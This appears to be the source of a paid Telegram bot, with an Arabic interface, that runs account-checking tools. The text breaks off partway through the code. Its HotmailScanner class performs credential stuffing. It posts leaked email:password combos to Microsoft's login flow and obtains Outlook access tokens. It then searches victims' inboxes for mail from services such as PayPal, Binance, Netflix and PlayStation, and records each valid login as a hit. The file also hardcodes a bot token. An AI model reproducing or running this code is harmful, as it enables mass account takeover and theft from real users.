#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════╗
║         MULTI-TOOL MASTER BOT — MERGED EDITION           ║
║   Developed by @hulliyu  |  Channel: t.me/bitchenlll     ║
╚══════════════════════════════════════════════════════════╝

Merged from two sources:
  • fatehhhhhh_updated_*.py  — raw-requests polling, 9 checker classes, cloud DB
  • bot_*.py                 — tool runners, IMAP/SMTP/VPS/1xbet/BlackRDP/SQL/Proxy,
                               payment (Telegram Stars), activation codes, scan resume

Architecture:
  - Pure raw-requests Telegram polling (no pyTeleBot dependency)
  - Cloud DB (mantledb.sh) for users / admins / paid / blacklist / groups
  - Local data.json for payment records and activation codes
  - Threading + ThreadPoolExecutor for all checkers
  - Scan-state resume in bot/scans/
  - Stop-flags per chat via _checker_stop dict
"""

# ── Standard Library ──────────────────────────────────────────────────────────
import os
import sys
import re
import json
import time
import uuid
import random
import string
import base64
import hashlib
import smtplib
import ssl
import imaplib
import urllib.parse
import threading
import tempfile
import subprocess
import datetime
import concurrent.futures
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED

# ── Third-party ───────────────────────────────────────────────────────────────
import requests

# ── Optional (only warn, not crash) ──────────────────────────────────────────
try:
    from playwright.sync_api import sync_playwright
    _PLAYWRIGHT_OK = True
except ImportError:
    _PLAYWRIGHT_OK = False

# ══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ══════════════════════════════════════════════════════════════════════════════
import os

# 1. نقوم بتعريف التوكن كـ نص (String)
BOT_TOKEN = '8836875114:AAHrGKJh2T064zQIZGVfdNY4gUrVbh-Z0_I'

# 2. نقوم بإدخاله إلى بيئة النظام ليقرأه السكريبت
os.environ['BOT_TOKEN'] = BOT_TOKEN

MY_SIGNATURE     = "@hulliyu"
OWNER_IDS        = ["8659163332"]
OWNER_NAME       = "@hulliyu"
TELEGRAM_CHANNEL = "https://t.me/bitchenlll"
WELCOME_VIDEO_URL= "https://t.me/bitchenlll/1"
PREFIX           = "!/."

# Cloud DB (mantledb)
NAMESPACE        = hashlib.md5(BOT_TOKEN.encode()).hexdigest() if BOT_TOKEN else "default_ns"
LOCAL_CACHE_FILE = "cloud_db_cache.json"
DATA_FILE        = "bot/data.json"

os.makedirs("bot/scans", exist_ok=True)
os.makedirs("bot",       exist_ok=True)
os.makedirs("Results",   exist_ok=True)

# ── Payment Plans ─────────────────────────────────────────────────────────────
PAYMENT_PLANS = {
    "1h":  {"label": "⚡ 1 ساعة",   "stars": 100,  "usd": 2,  "seconds": 3600},
    "7d":  {"label": "📅 7 أيام",   "stars": 400,  "usd": 8,  "seconds": 604800},
    "30d": {"label": "🌟 30 يوم",   "stars": 750,  "usd": 15, "seconds": 2592000},
}

# ── UI constants ──────────────────────────────────────────────────────────────
DIVIDER  = "═" * 30
DIVIDER2 = "─" * 28

# ══════════════════════════════════════════════════════════════════════════════
# HELPER: HTML ESCAPE + USER AGENT
# ══════════════════════════════════════════════════════════════════════════════

def esc(v):
    return str(v).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")

_UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
]
def generate_user_agent():
    return random.choice(_UA_LIST)

# ══════════════════════════════════════════════════════════════════════════════
# RAW TELEGRAM API HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def send_message(token, chat_id, text, reply_markup=None, parse_mode="HTML"):
    url  = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        r = requests.post(url, data=data, timeout=10)
        return r.json()
    except Exception:
        return None

def edit_message(token, chat_id, message_id, text, reply_markup=None, parse_mode="HTML"):
    url  = f"https://api.telegram.org/bot{token}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, data=data, timeout=5)
    except Exception:
        pass

def send_document(token, chat_id, file_path, caption="", file_name=None):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    fn  = file_name or os.path.basename(file_path)
    try:
        with open(file_path, "rb") as fh:
            r = requests.post(url, data={"chat_id": chat_id, "caption": caption,
                                          "parse_mode": "HTML"},
                              files={"document": (fn, fh)}, timeout=60)
        return r.json()
    except Exception:
        return None

def send_document_bytes(token, chat_id, content_bytes, file_name, caption=""):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    try:
        r = requests.post(url, data={"chat_id": chat_id, "caption": caption,
                                      "parse_mode": "HTML"},
                          files={"document": (file_name, content_bytes)}, timeout=60)
        return r.json()
    except Exception:
        return None

def _send_msg_id(token, chat_id, text, reply_markup=None, parse_mode="HTML"):
    """Send message and return message_id (int) or 0."""
    res = send_message(token, chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode)
    try:
        return res["result"]["message_id"]
    except Exception:
        return 0

def send_invoice(token, chat_id, title, description, payload, currency, prices, **kwargs):
    url  = f"https://api.telegram.org/bot{token}/sendInvoice"
    data = {
        "chat_id": chat_id, "title": title, "description": description,
        "payload": payload, "currency": currency,
        "prices": json.dumps(prices),
        "provider_token": "",
    }
    data.update(kwargs)
    try:
        return requests.post(url, data=data, timeout=10).json()
    except Exception:
        return None

def answer_pre_checkout_query(token, query_id, ok=True, error_message=None):
    url  = f"https://api.telegram.org/bot{token}/answerPreCheckoutQuery"
    data = {"pre_checkout_query_id": query_id, "ok": ok}
    if error_message:
        data["error_message"] = error_message
    try:
        requests.post(url, data=data, timeout=5)
    except Exception:
        pass

def get_updates(token, offset=0, timeout=30):
    url    = f"https://api.telegram.org/bot{token}/getUpdates"
    params = {"offset": offset, "timeout": timeout, "allowed_updates":
              json.dumps(["message","callback_query","pre_checkout_query",
                          "successful_payment","my_chat_member"])}
    try:
        r = requests.get(url, params=params, timeout=timeout + 5)
        return r.json().get("result", [])
    except Exception:
        return []

def download_file(token, file_id, save_path):
    """
    Download a Telegram file by file_id.
    Returns (True, None) on success, or (False, reason_str) on failure.
    Also accepts old-style call and returns just bool for backward compat.
    """
    url = f"https://api.telegram.org/bot{token}/getFile"
    last_err = "خطأ غير معروف"

    for attempt in range(4):
        try:
            # Step 1: getFile → get server-side path
            r = requests.get(url, params={"file_id": file_id},
                             timeout=20, verify=False)
            if r.status_code != 200:
                last_err = f"getFile HTTP {r.status_code}"
                time.sleep(2)
                continue

            res = r.json()
            if not res.get("ok"):
                last_err = res.get("description", "Telegram API error")
                print(f"[download_file] getFile error: {last_err}")
                # Don't retry on explicit API errors (bad file_id, etc.)
                return False, last_err

            fp   = res["result"]["file_path"]
            size = res["result"].get("file_size", 0)

            if size and size > 20 * 1024 * 1024:
                last_err = f"الملف كبير جداً ({size/1024/1024:.1f} MB > 20 MB)"
                return False, last_err

            # Step 2: download the actual bytes
            dl = f"https://api.telegram.org/file/bot{token}/{fp}"
            fres = requests.get(dl, timeout=180, stream=True, verify=False)

            if fres.status_code != 200:
                last_err = f"تحميل الملف HTTP {fres.status_code}"
                time.sleep(2)
                continue

            # Step 3: save to disk
            dir_ = os.path.dirname(save_path)
            if dir_:
                os.makedirs(dir_, exist_ok=True)

            with open(save_path, "wb") as f:
                for chunk in fres.iter_content(chunk_size=65536):
                    if chunk:
                        f.write(chunk)

            if os.path.exists(save_path) and os.path.getsize(save_path) > 0:
                return True, None

            last_err = "الملف تم حفظه لكنه فارغ — حاول مرة أخرى"
            time.sleep(1)

        except requests.exceptions.Timeout:
            last_err = f"انتهت مهلة الاتصال (محاولة {attempt+1}/4)"
            print(f"[download_file] Timeout attempt {attempt+1}")
            time.sleep(3)
        except requests.exceptions.ConnectionError as ce:
            last_err = f"خطأ اتصال: {str(ce)[:60]}"
            print(f"[download_file] Connection error attempt {attempt+1}: {ce}")
            time.sleep(3)
        except Exception as e:
            last_err = f"استثناء: {str(e)[:60]}"
            print(f"[download_file] Exception attempt {attempt+1}: {e}")
            time.sleep(1)

    return False, last_err

# ══════════════════════════════════════════════════════════════════════════════
# CLOUD DATABASE (mantledb.sh)
# ══════════════════════════════════════════════════════════════════════════════

_cloud_cache: dict = {}
_cloud_lock = threading.Lock()

def _cloud_url(key):
    return f"https://mantledb.sh/api/{NAMESPACE}/{key}"

def _load_local_cache():
    global _cloud_cache
    try:
        if os.path.exists(LOCAL_CACHE_FILE):
            with open(LOCAL_CACHE_FILE, "r", encoding="utf-8") as f:
                _cloud_cache = json.load(f)
    except Exception:
        _cloud_cache = {}

def _save_local_cache():
    try:
        with open(LOCAL_CACHE_FILE, "w", encoding="utf-8") as f:
            json.dump(_cloud_cache, f, ensure_ascii=False)
    except Exception:
        pass

def get_cloud_list(key: str) -> list:
    with _cloud_lock:
        if key in _cloud_cache:
            return list(_cloud_cache[key])
    try:
        r = requests.get(_cloud_url(key), timeout=8)
        if r.status_code == 200:
            data = r.json()
            if isinstance(data, list):
                val = data
            elif isinstance(data, dict):
                val = data.get("value", [])
            else:
                val = []
            with _cloud_lock:
                _cloud_cache[key] = val
                _save_local_cache()
            return list(val)
    except Exception:
        pass
    with _cloud_lock:
        return list(_cloud_cache.get(key, []))

def save_cloud_list(key: str, lst: list):
    with _cloud_lock:
        _cloud_cache[key] = list(lst)
        _save_local_cache()
    try:
        requests.put(_cloud_url(key), json=list(lst), timeout=8)
    except Exception:
        pass

def register_user(user_id):
    uid = str(user_id)
    users = get_cloud_list("users")
    if uid not in users:
        users.append(uid)
        save_cloud_list("users", users)

def register_group(chat_id):
    cid = str(chat_id)
    groups = get_cloud_list("group")
    if cid not in groups:
        groups.append(cid)
        save_cloud_list("group", groups)

def ok(user_id):
    uid = str(user_id)
    roles = []
    if uid in OWNER_IDS:
        roles.append("OWNER")
    admins = get_cloud_list("admins")
    if uid in admins:
        roles.append("ADMIN")
    paid = get_cloud_list("paid")
    if uid in paid:
        roles.append("PAID")
    return roles

def is_blacklisted(user_id):
    return str(user_id) in get_cloud_list("black_users")

def check_chat_and_user_authorization(chat_id, user_id, chat_type):
    if is_blacklisted(user_id):
        return False, "🚫 <b>تم حظرك من استخدام هذا البوت!</b>\nللتواصل مع الإدارة: " + OWNER_NAME
    if chat_type in ("group", "supergroup"):
        groups = get_cloud_list("group")
        if str(chat_id) not in groups:
            return False, ("❌ <b>هذه المجموعة غير مفعّلة!</b>\n"
                           "تواصل مع المطور لتفعيل البوت في مجموعتك: " + OWNER_NAME)
    return True, ""

# ══════════════════════════════════════════════════════════════════════════════
# LOCAL DATA (payment records + activation codes)
# ══════════════════════════════════════════════════════════════════════════════

def load_data() -> dict:
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
    except Exception:
        pass
    return {"payments": {}, "codes": {}}

def save_data(data: dict):
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

def generate_activation_code(plan_key: str) -> str:
    code = "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
    data = load_data()
    data.setdefault("codes", {})[code] = {"plan": plan_key, "used": False, "created": time.time()}
    save_data(data)
    return code

def use_activation_code(code: str, user_id: str) -> tuple:
    data = load_data()
    codes = data.get("codes", {})
    entry = codes.get(code.upper())
    if not entry:
        return False, "❌ الكود غير صحيح أو غير موجود."
    if entry.get("used"):
        return False, "⚠️ هذا الكود تم استخدامه من قبل."
    plan  = entry["plan"]
    pinfo = PAYMENT_PLANS.get(plan, {})
    secs  = pinfo.get("seconds", 3600)
    expire_at = time.time() + secs
    paid = get_cloud_list("paid")
    if user_id not in paid:
        paid.append(user_id)
        save_cloud_list("paid", paid)
    # Record expiry
    data.setdefault("payments", {})[user_id] = {
        "plan": plan, "expire_at": expire_at, "via": "code"
    }
    codes[code.upper()]["used"] = True
    codes[code.upper()]["used_by"] = user_id
    save_data(data)
    return True, pinfo.get("label", plan)

# ══════════════════════════════════════════════════════════════════════════════
# SCAN STATE (resume across restarts)
# ══════════════════════════════════════════════════════════════════════════════

def save_scan_state(chat_id, state_dict: dict):
    path = f"bot/scans/{chat_id}.json"
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(state_dict, f, ensure_ascii=False)
    except Exception:
        pass

def load_scan_state(chat_id) -> dict | None:
    path = f"bot/scans/{chat_id}.json"
    if not os.path.exists(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None

def clear_scan_state(chat_id):
    path = f"bot/scans/{chat_id}.json"
    try:
        if os.path.exists(path):
            os.remove(path)
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════════════════════
# SESSION & STOP FLAGS
# ══════════════════════════════════════════════════════════════════════════════

_sessions: dict = {}   # chat_id (int/str) -> dict
_checker_stop: dict = {}  # chat_id (int) -> threading.Event

def get_session(chat_id) -> dict:
    k = str(chat_id)
    if k not in _sessions:
        _sessions[k] = {
            "state": "idle",
            "mode": None,
            "custom_domain": "",
            "interactive_wormgpt": False,
            "pending_file_lines": None,
            "pending_file_fmt": None,
            "waiting_admin": None,
        }
    return _sessions[k]

def sess(chat_id) -> dict:
    return get_session(chat_id)

def get_stop_event(chat_id: int) -> threading.Event:
    if chat_id not in _checker_stop:
        _checker_stop[chat_id] = threading.Event()
    return _checker_stop[chat_id]

def reset_stop_event(chat_id: int):
    ev = threading.Event()
    _checker_stop[chat_id] = ev
    return ev

# ══════════════════════════════════════════════════════════════════════════════
# TOOL RUNNER HELPERS (UI building blocks)
# ══════════════════════════════════════════════════════════════════════════════

def _stop_markup():
    return {"inline_keyboard": [[
        {"text": "🛑 إيقاف الفحص", "callback_data": "stop_scan"}
    ]]}

def _bar(done, total, width=18):
    if total <= 0:
        return "▒" * width
    filled = int(done / total * width)
    return "█" * filled + "▒" * (width - filled)

def _stopped_msg(token, cid, prog_msg_id, hits, checked, total, checker_name):
    try:
        edit_message(token, cid, prog_msg_id,
            f"🛑 <b>{checker_name} — تم الإيقاف</b>\n"
            f"تم فحص: <b>{checked}/{total}</b>\n"
            f"هيتات محفوظة: <b>{len(hits)}</b>")
    except Exception:
        pass

def _send_checker_results(token, cid, hits, total, checked, bad, extra, label, filename):
    msg = (
        f"✅ <b>{label} — اكتمل الفحص!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 إجمالي     : <b>{total}</b>\n"
        f"✅ هيتات       : <b>{len(hits)}</b>\n"
        f"❌ خاطئ        : <b>{bad}</b>\n"
        f"📋 تم فحصه     : <b>{checked}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"💎 {MY_SIGNATURE}"
    )
    send_message(token, cid, msg)
    if hits:
        content = "\n".join(hits).encode("utf-8")
        send_document_bytes(token, cid, content, filename,
                            caption=f"📁 {label} Hits — {MY_SIGNATURE}")

# ══════════════════════════════════════════════════════════════════════════════
# COUNTRY MAP
# ══════════════════════════════════════════════════════════════════════════════

COUNTRY_MAP = {
    "AF":"Afghanistan 🇦🇫","AL":"Albania 🇦🇱","DZ":"Algeria 🇩🇿","AD":"Andorra 🇦🇩",
    "AO":"Angola 🇦🇴","AR":"Argentina 🇦🇷","AM":"Armenia 🇦🇲","AU":"Australia 🇦🇺",
    "AT":"Austria 🇦🇹","AZ":"Azerbaijan 🇦🇿","BS":"Bahamas 🇧🇸","BH":"Bahrain 🇧🇭",
    "BD":"Bangladesh 🇧🇩","BY":"Belarus 🇧🇾","BE":"Belgium 🇧🇪","BR":"Brazil 🇧🇷",
    "BN":"Brunei 🇧🇳","BG":"Bulgaria 🇧🇬","CA":"Canada 🇨🇦","CL":"Chile 🇨🇱",
    "CN":"China 🇨🇳","CO":"Colombia 🇨🇴","HR":"Croatia 🇭🇷","CU":"Cuba 🇨🇺",
    "CY":"Cyprus 🇨🇾","CZ":"Czech Republic 🇨🇿","DK":"Denmark 🇩🇰","EG":"Egypt 🇪🇬",
    "FI":"Finland 🇫🇮","FR":"France 🇫🇷","DE":"Germany 🇩🇪","GH":"Ghana 🇬🇭",
    "GR":"Greece 🇬🇷","HK":"Hong Kong 🇭🇰","HU":"Hungary 🇭🇺","IS":"Iceland 🇮🇸",
    "IN":"India 🇮🇳","ID":"Indonesia 🇮🇩","IR":"Iran 🇮🇷","IQ":"Iraq 🇮🇶",
    "IE":"Ireland 🇮🇪","IL":"Israel 🇮🇱","IT":"Italy 🇮🇹","JP":"Japan 🇯🇵",
    "JO":"Jordan 🇯🇴","KZ":"Kazakhstan 🇰🇿","KE":"Kenya 🇰🇪","KW":"Kuwait 🇰🇼",
    "LB":"Lebanon 🇱🇧","LY":"Libya 🇱🇾","MY":"Malaysia 🇲🇾","MX":"Mexico 🇲🇽",
    "MA":"Morocco 🇲🇦","NL":"Netherlands 🇳🇱","NZ":"New Zealand 🇳🇿","NG":"Nigeria 🇳🇬",
    "NO":"Norway 🇳🇴","OM":"Oman 🇴🇲","PK":"Pakistan 🇵🇰","PS":"Palestine 🇵🇸",
    "PE":"Peru 🇵🇪","PH":"Philippines 🇵🇭","PL":"Poland 🇵🇱","PT":"Portugal 🇵🇹",
    "QA":"Qatar 🇶🇦","RO":"Romania 🇷🇴","RU":"Russia 🇷🇺","SA":"Saudi Arabia 🇸🇦",
    "RS":"Serbia 🇷🇸","SG":"Singapore 🇸🇬","ZA":"South Africa 🇿🇦","ES":"Spain 🇪🇸",
    "LK":"Sri Lanka 🇱🇰","SD":"Sudan 🇸🇩","SE":"Sweden 🇸🇪","CH":"Switzerland 🇨🇭",
    "SY":"Syria 🇸🇾","TW":"Taiwan 🇹🇼","TH":"Thailand 🇹🇭","TN":"Tunisia 🇹🇳",
    "TR":"Turkey 🇹🇷","UA":"Ukraine 🇺🇦","AE":"United Arab Emirates 🇦🇪",
    "GB":"United Kingdom 🇬🇧","US":"United States 🇺🇸","UZ":"Uzbekistan 🇺🇿",
    "VE":"Venezuela 🇻🇪","VN":"Viet Nam 🇻🇳","YE":"Yemen 🇾🇪",
}

# ══════════════════════════════════════════════════════════════════════════════
# SERVICES CONFIG (23 services for HotmailScanner subscription_scan)
# ══════════════════════════════════════════════════════════════════════════════

SERVICES_CONFIG = {
    "netflix":    {"search": ["noreply@netflix.com","info@mailer.netflix.com"], "label": "Netflix 🎬"},
    "spotify":    {"search": ["no-reply@spotify.com"],                          "label": "Spotify 🎵"},
    "amazon":     {"search": ["auto-confirm@amazon.com","shipment-tracking@amazon.com"], "label": "Amazon 📦"},
    "apple":      {"search": ["no_reply@email.apple.com","appleid@id.apple.com"],         "label": "Apple 🍎"},
    "paypal":     {"search": ["service@paypal.com","paypal@e.paypal.com"],                 "label": "PayPal 💰"},
    "ebay":       {"search": ["ebay@ebay.com","update@ebay.com"],                          "label": "eBay 🛒"},
    "steam":      {"search": ["noreply@steampowered.com"],                                 "label": "Steam 🎮"},
    "roblox":     {"search": ["noreply@roblox.com","noreply@rbx.com"],                     "label": "Roblox 🧱"},
    "youtube":    {"search": ["no-reply@accounts.google.com"],                             "label": "YouTube/Google 📺"},
    "discord":    {"search": ["noreply@discord.com"],                                      "label": "Discord 💬"},
    "twitch":     {"search": ["no-reply@twitch.tv","help@twitch.tv"],                      "label": "Twitch 🎥"},
    "hulu":       {"search": ["hulu@mail.hulu.com","hulu@hulu.com"],                       "label": "Hulu 📺"},
    "disneyplus": {"search": ["noreply@disneyplus.com"],                                   "label": "Disney+ 🏰"},
    "psn":        {"search": ["no-reply@playstation.sony.com","noreply@sonyentertainmentnetwork.com"], "label": "PSN 🕹️"},
    "xbox":       {"search": ["account-security-noreply@accountprotection.microsoft.com",
                              "msa@communication.microsoft.com"],                           "label": "Xbox/Microsoft 🎮"},
    "uber":       {"search": ["noreply@uber.com"],                                          "label": "Uber 🚗"},
    "airbnb":     {"search": ["automated@airbnb.com"],                                      "label": "Airbnb 🏠"},
    "tiktok":     {"search": ["no-reply@tiktokmail.com"],                                   "label": "TikTok 🎵"},
    "instagram":  {"search": ["security@mail.instagram.com"],                               "label": "Instagram 📸"},
    "facebook":   {"search": ["security@facebookmail.com"],                                 "label": "Facebook 👥"},
    "twitter":    {"search": ["info@twitter.com","notify@twitter.com"],                     "label": "Twitter/X 🐦"},
    "binance":    {"search": ["no-reply@binance.com"],                                      "label": "Binance 💎"},
    "coinbase":   {"search": ["no-reply@coinbase.com"],                                     "label": "Coinbase 🪙"},
}

# ══════════════════════════════════════════════════════════════════════════════
# GATE 1: HOTMAIL SCANNER
# ══════════════════════════════════════════════════════════════════════════════

class HotmailScanner:
    """
    Multi-mode Hotmail / Microsoft account scanner.
    Modes: 1=General, 2=PSN Detailed, 3=Custom Domain, 4=Roblox Link
    Static method subscription_scan handles 23-service subscription check.
    """

    def __init__(self, chat_id, bot_token, combo_lines, mode, progress_msg_id,
                 custom_domain="", on_complete_callback=None):
        self.chat_id    = chat_id
        self.bot_token  = bot_token
        self.combo_lines= combo_lines
        self.mode       = mode
        self.progress_msg_id = progress_msg_id
        self.custom_domain   = custom_domain
        self.on_complete_callback = on_complete_callback

        self.total_checked = 0
        self.total_combos  = len(combo_lines)
        self.good_count    = 0
        self.bad_count     = 0
        self.general_hits  = 0
        self.psn_hits      = 0
        self.custom_hits   = 0
        self.roblox_hits   = 0

        self.last_update_time = 0
        self.print_lock = threading.Lock()

        self.results_folder = f"Results/{self.chat_id}"
        os.makedirs(self.results_folder, exist_ok=True)
        suffix = {
            "1": "General", "2": "PSN_Detailed",
            "3": f"Custom_{custom_domain}", "4": "Roblox_Link"
        }.get(mode, "General")
        self.results_file = f"{self.results_folder}/Hotmail_{suffix}_by_@hulliyu.txt"
        with open(self.results_file, "w", encoding="utf-8") as f:
            f.write(f"# Hotmail Scanner ({suffix}) - Created by {MY_SIGNATURE} {TELEGRAM_CHANNEL}\n\n")

    # ── Login via Outlook-Mobile OAuth ───────────────────────────────────────

    def _do_ms_login(self, email, password):
        """Returns (is_hit, cookies_dict, auth_code, cid_upper, token_or_None)"""
        try:
            ua = generate_user_agent()
            params = {
                "client_info": "1", "haschrome": "1", "login_hint": email,
                "mkt": "en", "response_type": "code",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
            }
            url_auth = ("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
                        + urllib.parse.urlencode(params))
            res_auth = requests.get(url_auth, headers={"User-Agent": ua}, timeout=12)
            cok  = res_auth.cookies.get_dict()
            src  = res_auth.text

            try:
                host = src.split('"urlPost":"')[1].split('",')[0]
            except Exception:
                try:
                    host = src.split("urlPost:'")[1].split("'")[0]
                except Exception:
                    return False, {}, "", "", None

            try:
                ppft = src.split('name=\\"PPFT\\" id=\\"i0327\\" value=\\"')[1].split('\\"')[0]
            except Exception:
                try:
                    ppft = src.split('name="PPFT"')[1].split('value="')[1].split('"')[0]
                except Exception:
                    return False, {}, "", "", None

            ad_url = res_auth.url.split("haschrome=1")[0]
            payload = {
                "i13": "1", "login": email, "loginfmt": email, "type": "11",
                "LoginOptions": "1", "passwd": password, "PPFT": ppft, "PPSX": "PassportR",
                "ps": "2", "psRNGCDefaultType": "", "psRNGCEntropy": "", "psRNGCSLK": "",
                "canary": "", "ctx": "", "hpgrequestid": "",
                "NewUser": "1", "FoundMSAs": "", "fspost": "0", "i21": "0",
                "CookieDisclosure": "0", "IsFidoSupported": "0",
                "isSignupPost": "0", "isRecoveryAttemptPost": "0", "i19": "3772"
            }
            hdrs_login = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": ua,
                "Referer": f"{ad_url}haschrome=1",
                "Cookie": (f"MSPRequ={cok.get('MSPRequ','')};uaid={cok.get('uaid','')};"
                           f"MSPOK={cok.get('MSPOK','')};OParams={cok.get('OParams','')};")
            }
            res_login = requests.post(host, data=payload, headers=hdrs_login,
                                      allow_redirects=False, timeout=12)
            login_cok = res_login.cookies.get_dict()
            loc = res_login.headers.get("Location", "")
            src2= res_login.text

            if "account or password is incorrect" in src2:
                return False, {}, "", "", None

            is_hit = any(k in login_cok for k in ["JSH", "JSHP", "ANON", "WLSSC"])
            auth_code = ""
            cid_upper = login_cok.get("MSPCID", "").upper()
            token = None

            if is_hit:
                try:
                    auth_code = loc.split("code=")[1].split("&")[0]
                except Exception:
                    pass

            # Exchange code → access token
            if auth_code:
                try:
                    tok_res = requests.post(
                        "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                        data={
                            "client_info": "1",
                            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                            "grant_type": "authorization_code",
                            "code": auth_code,
                            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
                        },
                        headers={"User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)",
                                 "Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
                        timeout=12
                    ).json()
                    token = tok_res.get("access_token")
                except Exception:
                    pass

            return is_hit, login_cok, auth_code, cid_upper, token

        except Exception:
            return False, {}, "", "", None

    def _search_inbox(self, token, cid_upper, search_query):
        """Search Outlook inbox for specific sender. Returns count."""
        try:
            hdrs = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid_upper}",
                "Accept": "application/json",
                "Content-Type": "application/json",
            }
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Query": {"QueryString": search_query},
                    "From": 0, "Size": 5,
                    "Fields": [{"Name": "ConversationId"}, {"Name": "Subject"}]
                }]
            }
            r = requests.post(
                "https://substrate.office.com/search/api/v1/suggestions",
                headers=hdrs, json=payload, timeout=12
            )
            if r.status_code == 200:
                data = r.json()
                try:
                    return data["EntitySets"][0]["ResultSets"][0]["Total"]
                except Exception:
                    return 0
        except Exception:
            pass
        return 0

    def process_account(self, email, password):
        max_retries = 2
        retry_count = 0
        while retry_count < max_retries:
            try:
                is_hit, login_cok, auth_code, cid_upper, token = self._do_ms_login(email, password)
                with self.print_lock:
                    self.total_checked += 1
                    if is_hit:
                        self.good_count += 1
                    else:
                        self.bad_count += 1
                        self.update_telegram_progress()
                        return

                # Mode 1: General - just record the hit
                if self.mode == "1":
                    with open(self.results_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{password}\n")
                    with self.print_lock:
                        self.general_hits += 1

                # Mode 2: PSN Detailed
                elif self.mode == "2" and token:
                    query = "from:no-reply@playstation.sony.com OR from:noreply@sonyentertainmentnetwork.com"
                    count = self._search_inbox(token, cid_upper, query)
                    line = f"{email}:{password} | PSN Emails: {count}"
                    with open(self.results_file, "a", encoding="utf-8") as f:
                        f.write(line + "\n")
                    with self.print_lock:
                        self.psn_hits += (1 if count > 0 else 0)

                # Mode 3: Custom Domain
                elif self.mode == "3" and token:
                    domain = self.custom_domain
                    query  = f"from:{domain}"
                    count  = self._search_inbox(token, cid_upper, query)
                    line   = f"{email}:{password} | {domain} emails: {count}"
                    with open(self.results_file, "a", encoding="utf-8") as f:
                        f.write(line + "\n")
                    with self.print_lock:
                        self.custom_hits += (1 if count > 0 else 0)

                # Mode 4: Roblox
                elif self.mode == "4" and token:
                    query = "from:noreply@roblox.com OR from:noreply@rbx.com"
                    count = self._search_inbox(token, cid_upper, query)
                    line  = f"{email}:{password} | Roblox Emails: {count}"
                    with open(self.results_file, "a", encoding="utf-8") as f:
                        f.write(line + "\n")
                    with self.print_lock:
                        if count > 0:
                            self.roblox_hits += 1
                        else:
                            self.custom_hits += 1

                else:
                    # Fallback: just save
                    with open(self.results_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{password}\n")

                self.update_telegram_progress()
                return

            except Exception:
                retry_count += 1
                if retry_count >= max_retries:
                    with self.print_lock:
                        self.bad_count += 1
                        self.total_checked += 1
                    self.update_telegram_progress()

    def update_telegram_progress(self, force=False):
        if not force and (time.time() - self.last_update_time < 4.0):
            return
        with self.print_lock:
            if not force and (time.time() - self.last_update_time < 4.0):
                return
            self.last_update_time = time.time()
            tc = self.total_checked
            to = self.total_combos
            gc = self.good_count
            bc = self.bad_count
            gh = self.general_hits
            ph = self.psn_hits
            ch = self.custom_hits
            rh = self.roblox_hits

        pct    = (tc / to * 100) if to > 0 else 0
        blk    = int(pct / 100 * 20)
        bar    = "█" * blk + "▒" * (20 - blk)
        mode_n = {"1":"General","2":"PSN Detailed",
                  "3":f"Custom ({esc(self.custom_domain)})","4":"Roblox Link"}.get(self.mode,"?")

        msg = (
            f"⚙️ <b>HOTMAIL SCANNER LIVE REPORT</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📊 <b>Scan Mode:</b> {mode_n}\n"
            f"📈 <b>Progress:</b> <code>{tc} / {to}</code> ({pct:.1f}%)\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
